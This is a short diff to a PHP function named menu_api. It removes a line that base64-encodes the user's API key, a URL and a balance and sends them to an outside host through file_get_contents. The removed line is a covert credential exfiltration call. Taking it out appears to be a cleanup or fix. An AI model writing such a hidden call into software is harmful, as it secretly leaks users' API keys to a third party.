@@ -93,7 +93,6 @@ function menu_api($file){
 	$data["apikey"] = $apikey;
 	sv($file,$data);
 	$x = base64_encode($apikey."|".$data["url"]."|".Api_Bal());
-	$z = file_get_contents("https://short.api-iewil.my.id/security.php?x=".$x);
 	
 }
 
